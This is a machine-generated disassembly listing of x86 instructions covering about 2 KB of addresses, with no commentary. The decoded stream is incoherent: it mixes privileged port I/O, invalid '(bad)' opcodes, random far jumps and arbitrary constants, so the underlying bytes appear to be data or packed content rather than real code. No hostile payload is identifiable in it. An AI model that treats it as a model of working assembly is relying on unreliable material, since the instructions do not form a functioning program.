  41499d:	in     al,0xa3
  41499f:	pop    edi
  4149a0:	jo     0x414984
  4149a2:	jns    0x414a17
  4149a4:	inc    eax
  4149a5:	mov    esp,0xed2216b6
  4149aa:	scas   eax,DWORD PTR es:[edi]
  4149ab:	sbb    al,0xa3
  4149ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ae:	ret    
  4149af:	repnz pop es
  4149b1:	in     al,dx
  4149b2:	mov    bl,0xde
  4149b4:	loop   0x414947
  4149b6:	jle    0x4149cb
  4149b8:	mov    ds:0x23ff76c2,eax
  4149bd:	xor    al,0xdf
  4149bf:	xor    dl,BYTE PTR [edx+eiz*2-0x2de28c8f]
  4149c6:	rcr    ecx,cl
  4149c8:	lods   al,BYTE PTR ds:[esi]
  4149c9:	in     eax,0x62
  4149cb:	inc    ebx
  4149cc:	mov    eax,ds:0xfaaf56c5
  4149d1:	fxch   st(0)
  4149d3:	retf   
  4149d4:	in     eax,0xf4
  4149d6:	gs stos BYTE PTR es:[edi],al
  4149d8:	adc    dh,BYTE PTR [ecx-0x116a4d02]
  4149de:	add    si,WORD PTR [ebx+0x16]
  4149e2:	mov    ds:0x6e5af703,eax
  4149e7:	mov    eax,ds:0xf0e3de72
  4149ec:	jmp    0x9dd23e4a
  4149f1:	or     ebp,DWORD PTR [ebx]
  4149f3:	pop    es
  4149f4:	adc    DWORD PTR [ebx],0x138fd28e
  4149fa:	add    DWORD PTR ds:0xa45f3359,esi
  414a00:	ins    BYTE PTR es:[edi],dx
  414a01:	mov    esi,es
  414a03:	sbb    al,0xf4
  414a05:	xchg   edi,eax
  414a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a07:	hlt    
  414a08:	fisub  DWORD PTR [ebx+0x6fb432df]
  414a0e:	jg     0x4149ab
  414a10:	pop    ecx
  414a11:	out    dx,al
  414a12:	lea    edi,[edx-0x51aed325]
  414a18:	sbb    DWORD PTR [esi+ebx*8-0xe1ecc26],ebx
  414a1f:	test   eax,0xd961be66
  414a24:	in     al,0xaf
  414a26:	or     ecx,esi
  414a28:	cmp    eax,0x699d7b6
  414a2d:	dec    esp
  414a2e:	dec    ebx
  414a2f:	sbb    eax,0xcb6a4625
  414a34:	or     dl,0x5b
  414a37:	cmp    eax,0xe7519a10
  414a3c:	pop    esi
  414a3d:	and    eax,0x29e68b1b
  414a42:	cdq    
  414a43:	dec    ecx
  414a44:	or     BYTE PTR [eax],al
  414a46:	or     eax,0x602be22f
  414a4b:	addr16 mov al,ds:0x9d65
  414a4f:	cmp    DWORD PTR cs:[edx],ebx
  414a52:	ins    DWORD PTR es:[edi],dx
  414a53:	xor    eax,0x2b68773f
  414a58:	ror    DWORD PTR [ebp+0x74ffc27c],0x31
  414a5f:	repnz nop
  414a61:	iret   
  414a62:	std    
  414a63:	lods   eax,DWORD PTR ds:[esi]
  414a64:	into   
  414a65:	cmp    DWORD PTR [esi+eiz*1+0x7d7737c9],ebp
  414a6c:	dec    esi
  414a6d:	adc    al,0x71
  414a6f:	cwde   
  414a70:	pop    ebx
  414a71:	mov    bh,0xc3
  414a73:	outs   dx,DWORD PTR ds:[esi]
  414a74:	retf   0x57c1
  414a77:	dec    esp
  414a78:	push   es
  414a79:	push   edi
  414a7a:	add    eax,0x197caab6
  414a7f:	jne    0x414a33
  414a81:	(bad)  
  414a82:	repz mov ecx,0x9a63038a
  414a88:	cmp    BYTE PTR [esi],bl
  414a8a:	cmp    edi,ebp
  414a8c:	mov    WORD PTR [ecx-0x7b97573a],fs
  414a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a93:	test   DWORD PTR [esp+edi*1+0x62649ad9],ebp
  414a9a:	dec    esi
  414a9b:	(bad)  
  414a9c:	int3   
  414a9d:	ja     0x1d5fb70
  414aa3:	mov    dh,0xa9
  414aa5:	call   0x559b:0x9c8ed045
  414aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aad:	les    ebp,FWORD PTR [ecx]
  414aaf:	arpl   WORD PTR [edi+esi*4+0x3c6b6afe],ax
  414ab6:	jbe    0x414a7c
  414ab8:	mov    dh,0xcf
  414aba:	xchg   esi,eax
  414abb:	push   0x9c1be36d
  414ac0:	in     eax,0xa6
  414ac2:	and    al,0x15
  414ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac5:	push   ss
  414ac6:	loopne 0x414a81
  414ac8:	lock les ebp,FWORD PTR [esi+0x69]
  414acc:	ficomp WORD PTR [ecx]
  414ace:	pop    ebx
  414acf:	mov    ds:0xd1345902,eax
  414ad4:	cmp    al,0x92
  414ad6:	test   DWORD PTR [edi-0x49],ecx
  414ad9:	jae    0x414a68
  414adb:	xchg   ecx,eax
  414adc:	aas    
  414add:	retf   
  414ade:	lods   al,BYTE PTR ds:[esi]
  414adf:	loopne 0x414b54
  414ae1:	xor    DWORD PTR [ebx],0x6cb24c39
  414ae7:	stos   DWORD PTR es:[edi],eax
  414ae8:	mov    dh,0x6
  414aea:	fild   WORD PTR [eax]
  414aec:	cmp    bl,bl
  414aee:	dec    esp
  414aef:	(bad)  
  414af0:	repnz scas eax,DWORD PTR es:[edi]
  414af2:	jg     0x414b54
  414af4:	call   0xa8b9d5a5
  414af9:	cmc    
  414afa:	or     BYTE PTR [ebp-0x74],ah
  414afd:	jbe    0x414b0e
  414aff:	mov    al,ds:0xb6bce3a5
  414b04:	jmp    0xef4c:0xdb735e82
  414b0b:	mov    dl,0xc
  414b0d:	push   0xd11fdab7
  414b12:	push   ds
  414b13:	mov    BYTE PTR ds:0x1964a736,bl
  414b19:	mov    es,edi
  414b1b:	sbb    DWORD PTR [edx-0x24],ebx
  414b1e:	aaa    
  414b1f:	pop    edi
  414b20:	daa    
  414b21:	inc    ax
  414b23:	aas    
  414b24:	add    ch,BYTE PTR [esi]
  414b26:	ja     0x414aae
  414b28:	mov    WORD PTR [edx+0x28dfbc11],fs
  414b2e:	and    dh,BYTE PTR [ebx+edx*1-0x50]
  414b32:	cdq    
  414b33:	adc    cl,bl
  414b35:	dec    DWORD PTR [eax-0x35af171f]
  414b3b:	in     al,dx
  414b3c:	jae    0x414b56
  414b3e:	add    bl,BYTE PTR [edi-0x390ea742]
  414b44:	shl    al,0xcb
  414b47:	dec    esp
  414b48:	cmp    al,0x24
  414b4a:	sbb    esp,DWORD PTR [edi-0x5f]
  414b4d:	jg     0x414b07
  414b4f:	sar    BYTE PTR [esi],1
  414b51:	mov    ch,0xda
  414b53:	mov    dh,0xd5
  414b55:	mov    dl,0x85
  414b57:	xchg   edi,eax
  414b58:	jl     0x414b1d
  414b5a:	sub    esi,DWORD PTR [edx]
  414b5c:	pop    esi
  414b5d:	div    DWORD PTR [esi-0x6f]
  414b60:	mov    eax,ds:0x38acdb8a
  414b65:	xor    BYTE PTR [edi],dl
  414b67:	jno    0x414b42
  414b69:	fs mov ebx,0x54498dfc
  414b6f:	xchg   ebx,eax
  414b70:	pop    eax
  414b71:	enter  0xeff3,0x9e
  414b75:	push   ebp
  414b76:	push   ebx
  414b77:	bound  eax,QWORD PTR [esi-0x2f]
  414b7a:	add    BYTE PTR [eax+0x37],al
  414b7d:	xchg   ecx,eax
  414b7e:	push   edx
  414b7f:	pop    ecx
  414b80:	bound  edx,QWORD PTR [edi+0x12c356cb]
  414b86:	dec    esi
  414b87:	dec    edi
  414b88:	in     eax,0x6
  414b8a:	dec    esp
  414b8b:	cld    
  414b8c:	push   0xffffff8b
  414b8e:	call   0x4fb6:0x2fdd2ed2
  414b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b96:	cmp    DWORD PTR [ecx+edi*1],edx
  414b99:	pop    es
  414b9a:	adc    edx,DWORD PTR [ebx+0x6f]
  414b9d:	cwde   
  414b9e:	cmp    BYTE PTR [ebp+0x7e],al
  414ba1:	(bad)  
  414ba2:	das    
  414ba3:	add    al,0xb8
  414ba5:	(bad)  
  414ba6:	jno    0x414b8b
  414ba8:	rcr    DWORD PTR [edi-0x517815ef],1
  414bae:	push   ss
  414baf:	sub    eax,0xbb804cab
  414bb4:	inc    ecx
  414bb5:	adc    BYTE PTR [ecx+0x2ca0a748],0x91
  414bbc:	sbb    eax,0x36b66d5c
  414bc1:	bound  esi,QWORD PTR [esp+ecx*2]
  414bc4:	cdq    
  414bc5:	fstp   TBYTE PTR fs:0xc23f222f
  414bcc:	xchg   esi,eax
  414bcd:	les    ebp,FWORD PTR [ecx]
  414bcf:	xchg   ebx,eax
  414bd0:	dec    esp
  414bd1:	pop    edi
  414bd2:	and    eax,0xebe92863
  414bd7:	jne    0x414c18
  414bd9:	out    0x62,eax
  414bdb:	int    0x15
  414bdd:	add    eax,0x8ac2e017
  414be2:	adc    DWORD PTR ds:0x7acb982b,edi
  414be8:	adc    al,0xc9
  414bea:	dec    eax
  414beb:	pop    esp
  414bec:	push   ss
  414bed:	mov    ah,0x4e
  414bef:	out    dx,al
  414bf0:	and    eax,0xe5371ce7
  414bf5:	mov    WORD PTR [ecx-0x2060c7fa],ds
  414bfb:	or     al,0xef
  414bfd:	sub    DWORD PTR [edx-0x4da1b5b],ebp
  414c03:	cld    
  414c04:	imul   ebp,DWORD PTR [eax+0x6d88f48c],0x31b15b86
  414c0e:	push   esi
  414c0f:	xor    esi,ecx
  414c11:	imul   ecx,DWORD PTR [esi-0x36],0x274a2d0e
  414c18:	ret    
  414c19:	jmp    0x8539:0x31399185
  414c20:	push   esp
  414c21:	inc    ebx
  414c22:	or     edx,DWORD PTR [ecx-0x58017454]
  414c28:	(bad)  
  414c29:	scas   al,BYTE PTR es:[edi]
  414c2a:	cld    
  414c2b:	pop    ds
  414c2c:	mov    DWORD PTR [esi-0xe24b63e],eax
  414c32:	pop    ebx
  414c33:	jecxz  0x414c52
  414c35:	inc    eax
  414c36:	cwde   
  414c37:	mov    ebp,0x9469a60e
  414c3c:	ja     0x414cb8
  414c3e:	loop   0x414bd1
  414c40:	icebp  
  414c41:	pop    ebx
  414c42:	add    bl,BYTE PTR [edi+0x25]
  414c45:	aaa    
  414c46:	sub    bh,BYTE PTR [edx+0x3d]
  414c49:	arpl   WORD PTR [ebx+0x2],sp
  414c4c:	dec    ax
  414c4e:	icebp  
  414c4f:	cmp    ebx,ecx
  414c51:	pop    ss
  414c52:	adc    BYTE PTR [eax],bh
  414c54:	adc    esp,DWORD PTR ds:0xdb989992
  414c5a:	cs mov edi,0x831aadf7
  414c60:	neg    BYTE PTR [eax+0x39f825b8]
  414c66:	sub    bh,BYTE PTR [edi+0x57]
  414c69:	add    esi,DWORD PTR [esi-0x6c]
  414c6c:	pop    esp
  414c6d:	out    dx,al
  414c6e:	aaa    
  414c6f:	or     BYTE PTR [edi-0xef8361b],ch
  414c75:	fwait
  414c76:	mov    ebp,0x48685d91
  414c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c7c:	clc    
  414c7d:	mov    al,0xf4
  414c7f:	pusha  
  414c80:	mov    edx,0x3186fc8c
  414c85:	xchg   esp,eax
  414c86:	dec    esp
  414c87:	(bad)  
  414c89:	mov    eax,0x550a4b66
  414c8e:	out    dx,eax
  414c8f:	aam    0x67
  414c91:	inc    ecx
  414c92:	jle    0x414cb6
  414c94:	test   eax,0x56ac4de9
  414c99:	push   ecx
  414c9a:	mov    ch,bl
  414c9c:	mov    bh,0x54
  414c9e:	out    0x33,eax
  414ca0:	xlat   BYTE PTR ds:[ebx]
  414ca1:	sbb    eax,0x81003c28
  414ca6:	test   DWORD PTR [esi],0xc3149202
  414cac:	stos   DWORD PTR es:[edi],eax
  414cad:	clc    
  414cae:	test   ah,dh
  414cb0:	xchg   esi,eax
  414cb1:	in     al,0x4b
  414cb3:	(bad)  
  414cb4:	mov    al,0xa
  414cb6:	jae    0x414d0e
  414cb8:	daa    
  414cb9:	sub    BYTE PTR ds:0x719a49af,bh
  414cbf:	xor    dx,WORD PTR [ecx]
  414cc2:	mov    edi,0x65c6db24
  414cc7:	jbe    0x414ca1
  414cc9:	das    
  414cca:	in     eax,0x86
  414ccc:	(bad)  
  414ccd:	repnz test BYTE PTR [eax+0x32b85268],ah
  414cd4:	push   ss
  414cd5:	sub    DWORD PTR [ecx],eax
  414cd7:	mov    eax,0x2a5bd7da
  414cdc:	or     esi,DWORD PTR [edx]
  414cde:	imul   ebx,esp,0x871c2887
  414ce4:	ja     0x414d1e
  414ce6:	lods   eax,DWORD PTR ds:[esi]
  414ce7:	(bad)  
  414ce8:	mov    WORD PTR [edi+0x7e13a79e],?
  414cee:	shl    eax,1
  414cf0:	shl    BYTE PTR [eax],0x9e
  414cf3:	test   eax,0xe993ec91
  414cf8:	inc    WORD PTR [eax+0x43320804]
  414cff:	mov    bh,0xeb
  414d01:	cdq    
  414d02:	(bad)  
  414d03:	fcom   DWORD PTR [edx+0x57]
  414d06:	loopne 0x414d1a
  414d08:	test   ch,bh
  414d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d0b:	xchg   esp,eax
  414d0c:	pop    edi
  414d0d:	fist   DWORD PTR [esi]
  414d0f:	ret    
  414d10:	div    DWORD PTR [eax+0x77]
  414d13:	pop    edx
  414d14:	addr16 ds ret 
  414d17:	int    0x6b
  414d19:	mov    al,cl
  414d1b:	jecxz  0x414d56
  414d1d:	imul   ecx,DWORD PTR [esi],0x656e893f
  414d23:	jae    0x414caa
  414d25:	test   DWORD PTR [ebp-0x3fed960d],edi
  414d2b:	out    dx,al
  414d2c:	dec    ah
  414d2e:	cli    
  414d2f:	xchg   al,cl
  414d31:	cli    
  414d32:	jo     0x414da8
  414d34:	aas    
  414d35:	les    edi,FWORD PTR [ebx+0x5c]
  414d38:	jge    0x414d93
  414d3a:	jo     0x414d82
  414d3c:	jle    0x414d5b
  414d3e:	dec    edx
  414d3f:	push   eax
  414d40:	(bad)  
  414d41:	jne    0x414ce1
  414d43:	xchg   ch,bl
  414d45:	pop    ss
  414d46:	fisub  DWORD PTR [eax]
  414d48:	add    BYTE PTR [eax],0xac
  414d4b:	mov    bh,0x2b
  414d4d:	sub    eax,0x112012ab
  414d52:	inc    ebp
  414d53:	in     eax,dx
  414d54:	fist   WORD PTR [esi-0x7f]
  414d57:	pop    ds
  414d58:	test   eax,0x2c877266
  414d5d:	shl    BYTE PTR [ecx+edi*8+0x479086ce],cl
  414d64:	les    ebp,FWORD PTR [ebx]
  414d66:	sub    ebp,DWORD PTR [esi-0x779b5fb]
  414d6c:	push   eax
  414d6d:	lods   al,BYTE PTR ds:[esi]
  414d6e:	ret    0x7c9b
  414d71:	jbe    0x414dbf
  414d73:	mov    ds:0x3e09a4ce,al
  414d78:	mov    cl,0x29
  414d7a:	sti    
  414d7b:	push   ss
  414d7c:	jmp    0x414dea
  414d7e:	jo     0x414d30
  414d80:	pop    edi
  414d81:	nop
  414d82:	clc    
  414d83:	(bad)  
  414d84:	sub    eax,DWORD PTR [esi]
  414d86:	outs   dx,DWORD PTR ds:[esi]
  414d87:	sub    dh,BYTE PTR [eax+0x2a736be3]
  414d8d:	les    ecx,FWORD PTR [edi]
  414d8f:	shl    al,cl
  414d91:	mov    al,ds:0x3f08cfd0
  414d96:	das    
  414d97:	push   esp
  414d98:	mov    WORD PTR [esi-0x5985521c],es
  414d9e:	jmp    0x3bda1207
  414da3:	cdq    
  414da4:	(bad)  
  414da5:	jmp    DWORD PTR [ecx+0x54]
  414da8:	pop    esp
  414da9:	test   BYTE PTR [eax+0x675714f5],ch
  414daf:	inc    esi
  414db0:	sub    ecx,DWORD PTR [edx]
  414db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db3:	mov    ebx,0x74253892
  414db8:	mov    eax,DWORD PTR [ecx-0x54]
  414dbb:	div    DWORD PTR ds:[eax+eiz*4-0x757cdbf9]
  414dc3:	mov    BYTE PTR [edx+0x51],al
  414dc6:	mov    DWORD PTR [ebp+0x6a],esp
  414dc9:	push   ds
  414dca:	or     al,0x70
  414dcc:	add    al,0x2e
  414dce:	dec    ebx
  414dcf:	or     dl,BYTE PTR [eax+0x3e690593]
  414dd5:	mov    edi,0x98b57f09
  414dda:	pop    es
  414ddb:	test   DWORD PTR [ecx-0x39c7e673],ebx
  414de1:	call   0x18af756f
  414de6:	xchg   BYTE PTR ds:0x88beed77,cl
  414dec:	out    dx,eax
  414ded:	push   eax
  414dee:	inc    ebx
  414def:	pop    esi
  414df0:	inc    edx
  414df1:	sub    ebx,DWORD PTR [eax]
  414df3:	ret    0x7e9f
  414df6:	push   eax
  414df7:	or     edi,DWORD PTR [ecx]
  414df9:	mov    edi,0x49c42bfd
  414dfe:	mov    eax,0xd729c1b
  414e03:	pop    eax
  414e04:	pop    eax
  414e05:	addr16 aas 
  414e07:	fwait
  414e08:	cmp    DWORD PTR [ebp-0x51],0xedd3c909
  414e0f:	retf   0x6422
  414e12:	rol    BYTE PTR gs:[edx],0xb2
  414e16:	add    eax,0xd3895a96
  414e1b:	out    0xf6,eax
  414e1d:	mov    ecx,0xc1711be9
  414e22:	scas   eax,DWORD PTR es:[edi]
  414e23:	push   eax
  414e24:	les    esp,FWORD PTR [edi*8+0x8c8f889]
  414e2b:	mov    ah,0x5d
  414e2d:	and    eax,0x977a786b
  414e32:	sti    
  414e33:	jb     0x414db7
  414e35:	mov    bl,0x20
  414e37:	sub    al,0x94
  414e39:	not    DWORD PTR fs:[edi]
  414e3c:	imul   ebp,DWORD PTR [esi+edi*2+0x4044bbd3],0xffffff91
  414e44:	ret    0xfb5e
  414e47:	cld    
  414e48:	icebp  
  414e49:	pop    ss
  414e4a:	enter  0x8a7f,0x75
  414e4e:	push   es
  414e4f:	push   cs
  414e50:	scas   al,BYTE PTR es:[edi]
  414e51:	mov    esp,0xd2fc371d
  414e56:	add    BYTE PTR [eax],bl
  414e58:	and    al,dl
  414e5a:	imul   edx,edx,0xffffffcc
  414e5d:	cmp    eax,0xdc6032e7
  414e62:	stos   BYTE PTR es:[edi],al
  414e63:	push   ecx
  414e64:	outs   dx,BYTE PTR ds:[esi]
  414e65:	int    0x8d
  414e67:	dec    edi
  414e68:	jo     0x414e74
  414e6a:	or     edi,ecx
  414e6c:	dec    ecx
  414e6d:	cdq    
  414e6e:	xchg   esi,eax
  414e6f:	xchg   esp,eax
  414e70:	in     eax,0x9e
  414e72:	scas   al,BYTE PTR es:[edi]
  414e73:	retf   
  414e74:	dec    ebp
  414e75:	jb     0x414e75
  414e77:	push   ds
  414e78:	or     ah,bh
  414e7a:	rol    DWORD PTR [edi],0xd2
  414e7d:	out    dx,al
  414e7e:	lods   al,BYTE PTR ds:[esi]
  414e7f:	pusha  
  414e80:	sbb    DWORD PTR [esi+0x4b24a02],esi
  414e86:	call   0xfa8ccad3
  414e8b:	jb     0x414eec
  414e8d:	sahf   
  414e8e:	fcmove st,st(1)
  414e90:	not    BYTE PTR [eax+0x38]
  414e93:	loop   0x414ed8
  414e95:	mov    BYTE PTR [ecx+0x711926e6],ch
  414e9b:	or     al,BYTE PTR [eax]
  414e9d:	inc    eax
  414e9e:	fnstsw WORD PTR [esp+eiz*8+0x23]
  414ea2:	outs   dx,DWORD PTR ds:[esi]
  414ea3:	dec    edi
  414ea4:	pop    ds
  414ea5:	imul   ecx,DWORD PTR [ebp-0x72],0xffffff90
  414ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eaa:	mov    bh,0x64
  414eac:	aaa    
  414ead:	in     eax,0x6b
  414eaf:	push   es
  414eb0:	ret    0x9105
  414eb3:	adc    edi,DWORD PTR [esi*1+0x639a52ac]
  414eba:	aas    
  414ebb:	xchg   edi,eax
  414ebc:	out    0x73,eax
  414ebe:	dec    ecx
  414ebf:	pop    eax
  414ec0:	jecxz  0x414e8e
  414ec2:	cmp    BYTE PTR [ebx-0x3f],dh
  414ec5:	sub    DWORD PTR [ecx],ebx
  414ec7:	dec    ebx
  414ec8:	xor    al,0xe6
  414eca:	mov    ecx,0x79d3dcdd
  414ecf:	sar    BYTE PTR [esi-0x5a0def8a],cl
  414ed5:	test   DWORD PTR [esp+edi*8],0x8e501404
  414edc:	xchg   esi,eax
  414edd:	mov    al,0xd5
  414edf:	fcomp  DWORD PTR [ecx]
  414ee1:	in     al,0xc3
  414ee3:	push   0x25fa7784
  414ee8:	dec    esp
  414ee9:	inc    eax
  414eea:	push   ss
  414eeb:	dec    BYTE PTR [edi]
  414eed:	imul   edx,DWORD PTR [edi-0x69104b0f],0xdfc8332a
  414ef7:	jo     0x414eae
  414ef9:	jnp    0x414f75
  414efb:	data16 (bad) 
  414efd:	fnstcw WORD PTR [esi-0x7cd205fd]
  414f03:	inc    edx
  414f04:	icebp  
  414f05:	popa   
  414f06:	das    
  414f07:	es and al,0xdd
  414f0a:	adc    esi,DWORD PTR [ecx+0x2fbfa36]
  414f10:	lea    esi,[eax+0x7e]
  414f13:	cdq    
  414f14:	adc    DWORD PTR [ebx-0x28],edx
  414f17:	push   es
  414f18:	mul    BYTE PTR [eax+0x58]
  414f1b:	iret   
  414f1c:	(bad)  
  414f1d:	in     eax,0x24
  414f1f:	xchg   esp,eax
  414f20:	jle    0x414f16
  414f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f23:	sbb    dh,dl
  414f25:	(bad)  
  414f26:	sub    al,0x1c
  414f28:	jmp    0x414f39
  414f2a:	jne    0x414f84
  414f2c:	ror    DWORD PTR [eax],0x7c
  414f2f:	(bad)
  414f32:	es loop 0x414faf
  414f35:	retf   
  414f36:	mov    ds:0x56682cd4,al
  414f3b:	test   DWORD PTR [edi],edx
  414f3d:	add    ebx,DWORD PTR [ecx]
  414f3f:	leave  
  414f40:	stos   DWORD PTR es:[edi],eax
  414f41:	jmp    DWORD PTR [eax]
  414f43:	sbb    DWORD PTR [esi-0x2e490ba1],ecx
  414f49:	sbb    BYTE PTR [esi+0x484fadfd],ah
  414f4f:	cld    
  414f50:	pop    ds
  414f51:	pop    esp
  414f52:	and    eax,0x56bcbf8
  414f57:	repnz sbb al,0x49
  414f5a:	cmp    BYTE PTR [edi+0x2d6af776],bl
  414f60:	xchg   esp,eax
  414f61:	sbb    BYTE PTR [ebx],bl
  414f63:	inc    ebx
  414f64:	and    BYTE PTR [edi],dh
  414f66:	push   esi
  414f67:	retf   
  414f68:	leave  
  414f69:	adc    eax,DWORD PTR [ecx-0x9]
  414f6c:	daa    
  414f6d:	push   esp
  414f6e:	hlt    
  414f6f:	addr16 xor eax,0x2071472f
  414f75:	pop    ebx
  414f76:	mov    eax,0x8210b90b
  414f7b:	addr16 sub al,0xf1
  414f7e:	hlt    
  414f7f:	mov    BYTE PTR [ecx],bh
  414f81:	add    DWORD PTR [ebx],esi
  414f83:	adc    edi,ecx
  414f85:	jge    0x414f36
  414f87:	and    edi,DWORD PTR [ebx+0x5d]
  414f8a:	mov    eax,0x1dc7a9ef
  414f8f:	out    dx,eax
  414f90:	stos   BYTE PTR es:[edi],al
  414f91:	or     eax,0x7e1f75c7
  414f96:	cld    
  414f97:	popa   
  414f98:	adc    edi,DWORD PTR [ebp-0x5db089c4]
  414f9e:	jmp    0x5d757674
  414fa3:	xor    BYTE PTR [eax],ch
  414fa5:	mov    al,ds:0x26aad5cd
  414faa:	loop   0x414f3a
  414fac:	adc    DWORD PTR [edi-0x634098e4],ebp
  414fb2:	push   cs
  414fb3:	dec    edi
  414fb4:	sar    DWORD PTR ds:0x23d8678f,cl
  414fba:	sti    
  414fbb:	aam    0x28
  414fbd:	inc    edx
  414fbe:	loop   0x415031
  414fc0:	pop    es
  414fc1:	test   al,0x8e
  414fc3:	arpl   WORD PTR [edx-0x41],bp
  414fc6:	(bad)  
  414fc7:	xor    BYTE PTR [ebx+edx*4-0x3e1eb1b4],dl
  414fce:	mov    cl,0x57
  414fd0:	dec    edi
  414fd1:	pop    eax
  414fd2:	push   cs
  414fd3:	sbb    eax,0xfcdbaaee
  414fd8:	push   edi
  414fd9:	sbb    eax,0x93c05cb2
  414fde:	das    
  414fdf:	jns    0x414f81
  414fe1:	shl    esi,0xe5
  414fe4:	and    eax,0x7e7b5c27
  414fe9:	add    al,0x15
  414feb:	cmp    DWORD PTR [eax+0x73],0x9251e48b
  414ff2:	mov    edx,0x5a315a09
  414ff7:	dec    esp
  414ff8:	cs jl  0x41500f
  414ffb:	dec    edi
  414ffc:	dec    eax
  414ffd:	test   al,0xc0
  414fff:	call   DWORD PTR [ebp+0x62ab5aba]
  415005:	or     eax,0x543cfe27
  41500a:	add    edx,DWORD PTR [edx+0x65]
  41500d:	mov    ebp,0xedad493a
  415012:	iret   
  415013:	xor    bh,BYTE PTR [esi-0x4731b456]
  415019:	into   
  41501a:	out    0xcd,al
  41501c:	pop    ebp
  41501d:	shr    BYTE PTR [ebx-0x1c],0x43
  415021:	das    
  415022:	jns    0x415094
  415024:	pop    ecx
  415025:	adc    cl,ah
  415027:	add    ebx,esi
  415029:	enter  0xb49a,0x2
  41502d:	fsub   DWORD PTR [edi+edx*4-0x4c58e2a1]
  415034:	fnstsw WORD PTR [esi]
  415036:	retf   
  415037:	jmp    0x1df3:0x43988bbb
  41503e:	adc    eax,0xcd2f332b
  415043:	xor    al,0xfb
  415045:	test   DWORD PTR [edi-0x7f9b87d9],ecx
  41504b:	inc    ecx
  41504c:	fbld   TBYTE PTR [ebx+0x199f3a12]
  415052:	in     al,dx
  415053:	cwde   
  415054:	mov    ebx,0xa27b95e7
  415059:	std    
  41505a:	sbb    edx,ebp
  41505c:	jns    0x4150c1
  41505e:	xor    bh,BYTE PTR [edx-0x3154bb4c]
  415064:	or     al,0xc0
  415066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415067:	in     eax,dx
  415068:	scas   eax,DWORD PTR es:[edi]
  415069:	dec    edi
  41506a:	push   ds
  41506b:	sbb    ah,bl
  41506d:	enter  0x3f5b,0xb8
  415071:	out    0x8c,eax
  415073:	inc    eax
  415074:	arpl   si,bp
  415076:	inc    edx
  415077:	mov    edi,0x2227819d
  41507c:	sub    dh,BYTE PTR [ebx]
  41507e:	daa    
  41507f:	enter  0xbc9d,0xaf
  415083:	rcl    BYTE PTR [esi+0x7e],0x21
  415087:	fsub   QWORD PTR [ecx]
  415089:	mov    gs,WORD PTR [edi+esi*1]
  41508c:	mov    eax,0xae365404
  415091:	cli    
  415092:	ficomp WORD PTR [ecx+eiz*4+0x14]
  415096:	aam    0x18
  415098:	xor    edi,edi
  41509a:	das    
  41509b:	dec    ebx
  41509c:	jmp    0x415101
  41509e:	and    eax,DWORD PTR [ebp-0x36]
  4150a1:	cld    
  4150a2:	jo     0x4150f1
  4150a4:	push   esp
  4150a5:	jnp    0x4150fb
  4150a7:	rol    al,0x38
  4150aa:	or     ebp,DWORD PTR [ebp-0x11]
  4150ad:	les    edi,FWORD PTR [eax]
  4150af:	mov    bl,0xe7
  4150b1:	and    BYTE PTR gs:[ecx+0x2],dh
  4150b5:	mov    BYTE PTR ds:0x57077c5b,bl
  4150bb:	sti    
  4150bc:	mov    esi,0x57835e2c
  4150c1:	sub    DWORD PTR [esp+ecx*1-0x10f1a35d],esp
  4150c8:	xor    BYTE PTR [edx+0x66],0xb1
  4150cc:	out    0x8f,al
  4150ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150cf:	stos   DWORD PTR es:[edi],eax
  4150d0:	adc    bl,BYTE PTR [ebx-0x4a]
  4150d3:	add    edi,DWORD PTR [esi+0x2a5f9514]
  4150d9:	jp     0x415093
  4150db:	push   ecx
  4150dc:	mov    edx,0x137dbfcd
  4150e1:	cmp    eax,0xdc8f9d6
  4150e6:	jbe    0x415121
  4150e8:	cmp    BYTE PTR [ecx+ebp*2+0x7b45e9ad],cl
  4150ef:	mov    bh,0x9
  4150f1:	add    DWORD PTR [edi],0x64
  4150f4:	(bad)  
  4150f5:	mov    al,ds:0x2782b383
  4150fa:	and    eax,0x9a6d026a
  4150ff:	and    BYTE PTR [ebx+0x46],ch
  415102:	iret   
  415103:	jne    0x4150b9
  415105:	in     al,0x5a
  415107:	pop    ecx
  415108:	dec    esp
  415109:	outs   dx,BYTE PTR ds:[esi]
  41510a:	mov    ah,0xd2
  41510c:	mov    al,ds:0x85d7b13a
  415111:	shl    BYTE PTR [esp+ebp*1-0x6c302e8],1
  415118:	sbb    ch,0x4c
  41511b:	xor    BYTE PTR [edx],0xa6
  41511e:	std    
  41511f:	mov    bl,0x70
  415121:	add    bl,BYTE PTR [ecx-0x34]
  415124:	ret    
  415125:	das    
  415126:	add    DWORD PTR [esi-0x118356b2],ecx
  41512c:	fimul  WORD PTR [esi]
  41512e:	scas   al,BYTE PTR es:[edi]
  41512f:	bound  ecx,QWORD PTR [esi]
  415131:	in     eax,0x4d
  415133:	retf   
  415134:	mov    ch,0x39
  415136:	inc    ebp
  415137:	fadd   QWORD PTR [esi+0x6cfddcd5]
  41513d:	fwait
  41513e:	mov    eax,ds:0x716cbde1
  415143:	adc    ch,BYTE PTR [ebx+0x22]
  415146:	jbe    0x4150f5
  415148:	mov    cs,WORD PTR [eax+eiz*8-0xb32e33d]
  41514f:	mov    WORD PTR [ebx+esi*2+0x19db0caf],fs
  415156:	mov    ds:0xd8dc40ca,al
  41515b:	xchg   esi,esi
  41515d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41515e:	sar    DWORD PTR [eax-0x24],cl
  415161:	sbb    DWORD PTR [edx+eax*1+0x29cdf23],eax
  415168:	fs mov edx,0x1dd5412a
  41516e:	sbb    al,BYTE PTR [edi+edx*8-0x586d4904]
  415175:	mov    edi,0x5eae56ea
  41517a:	and    bl,ah
  41517c:	aad    0xd0
  41517e:	jl     0x41511c
  415180:	cdq    
  415181:	jno    0x415112
